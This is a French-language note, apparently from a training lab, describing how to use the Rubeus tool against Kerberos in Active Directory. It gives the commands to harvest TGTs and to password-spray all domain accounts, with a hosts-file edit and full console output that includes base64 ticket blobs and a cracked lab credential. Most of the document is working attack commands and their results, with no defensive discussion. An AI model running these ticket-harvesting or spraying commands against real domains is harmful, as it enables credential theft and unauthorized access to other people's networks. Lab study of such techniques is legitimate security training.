---
tags: [active directory, cyber, kerberos, outil]
title: Rubeus - Récolte & Brute-Force des tickets
created: '2020-08-20T15:39:33.366Z'
modified: '2020-08-20T16:01:51.434Z'
---

# Rubeus - Récolte & Brute-Force des tickets

Rubeus est un outil puissant pour attaquer Kerberos. Rubeus est une adaptation de l'outil kekeo et a été développé par *HarmJ0y*, le très célèbre gourou des AD.

Rubeus dispose d'une grande variété d'attaques et de fonctionnalités qui lui permettent d'être un outil très polyvalent pour attaquer Kerberos. Parmi les nombreux outils et attaques :

- Overpass the hash
- Ticket request and renewal
- Ticket management
- Ticket extraction
- Harvesting
- Pass the ticket
- AS-REP roasting
- Kerberoasting

https://github.com/GhostPack/Rubeus

## Harvest - Récolte de tickets

La commande `harvest` rassemble les billets qui sont transférés au KDC et les sauvegarde pour les utiliser dans d'autres attaques telles que l'attaque "pass the ticket".

```cmd
Rubeus.exe harvest /interval:30
```

Par exemple :

```cmd
ontroller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Harvesting (with auto-renewal)
[*] Monitoring every 30 seconds for new TGTs
[*] Displaying the working TGT cache every 30 seconds


[*] Refreshing TGT ticket cache (8/20/2020 9:00:17 AM)

  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL 
  StartTime             :  8/20/2020 8:53:03 AM
  EndTime               :  8/20/2020 6:53:03 PM
  RenewTill             :  8/27/2020 8:53:03 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFhDCCBYCgAwIBBaEDAgEWooIEeDCCBHRhggRwMIIEbKADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyiJTAjoAMCAQKhHDAaGwZr
    cmJ0Z3QbEENPTlRST0xMRVIuTE9DQUyjggQoMIIEJKADAgESoQMCAQKiggQWBIIEEn0/Q6ef623WJTh74tzNKSujFxwO9f5T2EIX
    mb2EiaximG3ir4lWPn4PQuR3lNXMLX+tkftD5lo9XpQ83Dh9NapZzFLWSzb8J/ofRrMx2FBgr3+m61G8oxvNZGTBrFRkaxO+kUS9
    j4VZm89KePyXPeTVStIatPvjrlib+zNXdtfzl2cr0kp41c/en6aXt6rA5sIq/EJiqz+vLN7sfRGGCC7o5lSbIwWigApgzsV5/jYb
    YxAYDTB+aFdgJYSYW1pYdtdMBpr+GgV7F477LHiYR6NzOpjFc0VAVIEgA71CvxyySWqmozNGeByuNZWGd1qz0G51fHZ7/HqDZrtv
    7b+9qiivDiou2iljRel5Cd2gFpjbzbpUoK0F5ge/xTpEawaHXd0UhIupL8pYdUWit3OwUEy4UvnxfE6KQ2tCO3/WRIdOdXLZg0f8
    b+6oOi7Wv6V+VA6B6kQdlWReD7ss0ePCI9aZymE7Hx/5Z+51tpvwB11iRFg+RZWVlibxjT1feObTSLomwqATHPEVn3JIcvrT0/kL
    Oz67rrVcc7IoWQIAaUzoEVMRes7S4WSs7RtBBgHbpj/qMjt9ohQck8ZkM0o4kaIhwoPftG93ptpUEHTEHv4f61a8uJUjAva/xurD
    zODwiekgArvLstytoulQN7x8XY3C5eciMStSe6+CkFzyiuRiQkygJ3g68N62nL6saYzY+dEHBvvUgyVzetNlytL4kDmQ0uIXtNG/
    xKZnCGxQXWoni+qen9dgFQRiXVk2oDMQNqsAUL+FQE8If3s2oigYUl2PoAqkmUH4si8LfTq6vV8NJxtWL50j0zNfno5PazoQUy0t
    Rs+80e1GbRyzwPpR+ppqKOS8rrHFUxafUe0waWuMetppH4FCSZ2VgmvXkdtyGtH5OEh1pFW+bJyvRxI5XOs3tx8LHa8tBK1mEeSw
    6LzQHgh8SSI6T/DihAnntgYGneAiqDHV+iJr8O6CgWwfScQbJj7lDxQxFLipH0InfIt4gaEYvs68IQmLXHl2vy7No2UjZN+NQR6D
    NpnrBEnDEsQQdBv5yjV4EdGJuU+uOsWVubumbU2LsDvVeyiA3MJKbOhGgzKSuwVjfbCwSvyFTIlIieSXxAd/6NJ1gSY+tEuk9Vks
    scE820DRN2PUXnBwFpImx2GlwIvxIJ998WS4utJWY71ReAMNHc5zwXCe82O46qsuucVyIVyoDLt7F0ySwGBxk5cO35CbvgjCrmE8
    ZqlJvsQ4b0sWznydoB67zZ5XBTMPJXtASsehws6T3K5Msnwu2NFlUOw8zEOQhG2qJE8RGMG3zSGWo4i1RroFaIFDMWQ74AlwjcgI
    yNuH5XihwxNu7dXOhM8wRWYW7RqsP6C8vaT/eoESpOh08AGbBjIRLQKjgfcwgfSgAwIBAKKB7ASB6X2B5jCB46CB4DCB3TCB2qAr
    MCmgAwIBEqEiBCBNJ8Sp+Fc1xxQWJIvCykbf6ojbwgd1oxRWeM2Bh1o8daESGxBDT05UUk9MTEVSLkxPQ0FMohowGKADAgEBoREw
    DxsNQ09OVFJPTExFUi0xJKMHAwUAQOEAAKURGA8yMDIwMDgyMDE1NTMwM1qmERgPMjAyMDA4MjEwMTUzMDNapxEYDzIwMjAwODI3
    MTU1MzAzWqgSGxBDT05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLkxPQ0FM
```

## Brute - Brute-Forcing / Password Spraying avec Rubeus

Rubeus peut aussi bien brute-forcer des mots de passe que password sprayer sur des comptes d'utilisateurs. Lorsqu'on brute-force, on a besoin d'un utilisateur et d'une liste de mots de passe à essayer. Dans la password spraying de mots de passe, on donne un seul mot de passe tel que Password1 et on "pulvérisez" sur tous les comptes d'utilisateurs trouvés dans le domaine pour trouver lequel peut avoir ce mot de passe.

Cette attaque prend un mot de passe basé sur Kerberos, le pulvérise sur tous les utilisateurs trouvés et donne un ticket .kirbi. Ce ticket est un TGT qui peut être utilisé pour obtenir des tickets de service du KDC ainsi que pour être utilisé dans des attaques telles que l'attaque "pass the ticket".

Avant de pulvériser le mot de passe avec Rubeus, il faut ajouter le nom de domaine du contrôleur de domaine au fichier hôte de Windows. On peut ajouter l'adresse IP et le nom de domaine au fichier hôte de la machine en utilisant la commande echo : 

```cmd
echo 10.10.235.102 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts
```

On déclenche l'attaque :

```cmd
Rubeus.exe brute /password:Password1 /noticket
```

Par exemple :

```cmd
controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticket

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___  
  |  __  /| | | |  _ \| ___ | | | |/___) 
  | |  \ \| |_| | |_) ) ____| |_| |___ | 
  |_|   |_|____/|____/|_____)____/(___/  

  v1.5.0

[-] Blocked/Disabled user => Guest 
[-] Blocked/Disabled user => krbtgt 
[+] STUPENDOUS => Machine1:Password1
[*] base64(Machine1.kirbi):
 
      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi 
      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx 
      BIID7XGN5ee8uw7Y2CU9DDybo3IjCOVO9VouweyHyy8uiVK1RX/0tNDRIDt0B9FM3JjxQryKz4itRbdO
      kY2vNmsod1blu9JZ+nNceeHgyRLVwsZ/Gd/MPocQVq+IPVMGZVFGt1YH51XVEW7Ah7aVunyRrfmoUX1e
      QW6hWbySB4Ch3X98J+qUHz+gYEPEyy8fmuWq0Ta94SlFXvlswW+Z1E2b6tfWcJLrP5EcNvxGfBo15Pex
      A8m7JkkjVhJDKHOSHSpNRIsfR8XHvK9xbIsvN253g7sS6arya2qbyNr9JUKbRFod4dlzQRBdOqroEJfa
      Y3bWMRD5zLz3lI2Z7ZoZVUP+uiRCbp/iplnrl2YIm5ykAg8TwPS3sI5fUkKtHmWst0TI/8qIe4Rm4mKg
      T23ZOWeTzHVtbt6rBA95CV+KQpcjmlqaAw7PKbzTqPZboYyRQ4LYWgdSFMzHr0VOwAdNBHgs9upV852H
      b8RDwuW2flXT6YI3P2miYFccJ3KU1T+E6kMSEUaIPd5LIcGkStnxFXLx44R4BNwvfcTLejcB8H9jlgH1
      BsSO4z07MYlFOHVw6XtEOlYr4iOPKkEy3ZLt2mNIn7/iW+ZK4X7Gxi62gkS12tA6AtxCAcSb6r3wl6s4
      ixTbfgL3MZKmeDc5Gu7B9zcnFtJYhwZevmVvZJmwpn9koY+crXTJ7qRFdIhrDnqCn2jT2mzdyGFuoOk4
      HzpDK17AhQ/F8Hbn3CGmbvGB0xTv411VpFjvUq5ML+46/GDiabJI2jEg8FVSYoVpbLY2UhkpdzDaFebJ
      mO+EerqjLByAJGGXSExze+En+hGU67mvchuSUUDPCy/381k4sjVgZdg+6W+w+aw4LOxdoXrV+P8OhZZL
      lQdifMoXwvK4XfMvUMItzNbmVJv4TIb1crxnUw8tYLOxOtiKUOACBgklv1TlRizxkGTlNVL+gE8kGRNh
      ohONokRMKhGQxbOqtKLDZe0HPoE951v2Of5wu+H8GVLRleZkHCnKn4IDEIGCZ7YetAKWrhdO2WqEZb5m
      Fu2u06h4M29TqTd1AIYhu6GPWzv3bg1nyouzADYQGdPQD7TcQZYWgOOcX520TjkyPohETirxUXmnQ+Go
      kIqjUxqEA15mL1+7sLd7oPudFwFV9aN+ZEV4FAQncfCsGmY9gOeNpRgacRDoEorIt8Kv8v1yTMfn5vdm
      vyJ0EmTTdEQN5+9MnkVVTM0dlRK9NxTgFsZ8nA0mwB+kFwwZUrO9+N4nvt7gYyCVv8R6s3iM6lQbrwiv
      XSn942D07vW0GcaN2NTWGb71OAA6bujFIQltIw6qSPKoLNu8fQ2wV/FJAsyZKiMXA6OB8jCB76ADAgEA
      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIGnAV/kB/RRdGMRcpVMKjdCSRJoPnQmLWSzu
      Zmh+T7MzoRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
      GA8yMDIwMDgyMDE1NTcwOFqmERgPMjAyMDA4MjEwMTU3MDhapxEYDzIwMjAwODI3MTU1NzA4WqgSGxBD
      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs



[+] Done
```
